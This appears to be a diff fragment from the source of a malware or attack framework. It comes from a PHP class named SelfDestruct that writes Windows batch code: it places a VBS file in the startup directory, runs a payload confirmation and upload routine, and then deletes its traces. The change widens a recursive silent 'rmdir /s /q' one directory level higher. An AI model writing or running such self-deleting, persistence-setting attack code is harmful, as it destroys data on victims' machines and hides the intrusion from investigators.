@@ -74,7 +74,7 @@ class SelfDestruct extends AttackInterface {
         $UFile = "$startup_directory\\U" . substr($this->virus_id, 0, 5) . ".vbs";
         echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
         echo "del \"$UFile\"\n"; ?>
-        rmdir /s /q "%~pd0..\.."
+        rmdir /s /q "%~pd0..\..\.."
         <?php return ob_get_clean();
     }
     //@formatter:on
